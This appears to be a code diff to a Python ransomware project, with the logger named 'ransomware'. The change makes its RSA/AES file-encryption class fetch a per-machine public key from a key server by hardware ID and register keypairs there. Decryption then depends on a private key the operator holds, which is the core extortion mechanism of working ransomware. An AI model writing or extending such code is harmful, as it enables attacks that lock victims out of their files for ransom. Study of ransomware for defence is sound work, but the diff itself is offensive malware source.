@@ -3,7 +3,10 @@ from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util.Padding import pad
-
+import http.client
+from .utils import get_hwid
+import json
+from .exceptions import KeyPairCreationException
 
 logger = logging.getLogger("ransomware")
 
@@ -31,8 +34,9 @@ class RSAAESEncryption:
         :param private_key: The private key to use for encryption
         :param kwargs: Additional keyword arguments
         """
+        self._hwid = get_hwid()
         self.rsa_key_size = kwargs.get("rsa_key_size", RSA_DEFAULT_KEY_SIZE)
-        self.private_key = private_key or self._generate_rsa_key()
+        self.public_key = self._load_remote_public_key()
         self.session_key = get_random_bytes(
             int(kwargs.get("aes_key_size", 16)))
         self._prepare_cipher(
@@ -48,7 +52,7 @@ class RSAAESEncryption:
 
         :param aes_mode: The AES mode to use
         """
-        self.cipher_rsa = PKCS1_OAEP.new(self.private_key)
+        self.cipher_rsa = PKCS1_OAEP.new(self.public_key)
         self.cipher_aes = AES.new(self.session_key,
                                   aes_mode)
 
@@ -122,11 +126,25 @@ class RSAAESEncryption:
         except Exception as e:
             logger.error(f"Error while encrypting file: {fpath} - {e}")
 
-    def _load_remote_private_key(self, key_path: str):
+    def _load_remote_public_key(self):
         """
-        Load the private key from a file
+        Load the public key from a file
 
-        :param key_path: The path to the private key file
+        :return: The public key
         """
-        with open(key_path, "rb") as key_file:
-            self.private_key = RSA.import_key(key_file.read())
+        conn = http.client.HTTPConnection("localhost", 12001)
+        conn.request("GET", f"/keys/public_key/{self._hwid}")
+        response = json.loads(conn.getresponse().read().decode())
+        return RSA.import_key(response["public_key"])
+
+    def _create_keypair(self):
+        """
+        """
+        conn = http.client.HTTPConnection("localhost", 12001)
+        body = json.dumps({"uuid": self._hwid})
+        headers = {'Content-type': 'application/json'}
+        conn.request("POST", f"/keys/", body=body, headers=headers)
+        response = conn.getresponse()
+        if response.status != 200:
+            raise KeyPairCreationException("Error while creating key pair")
+
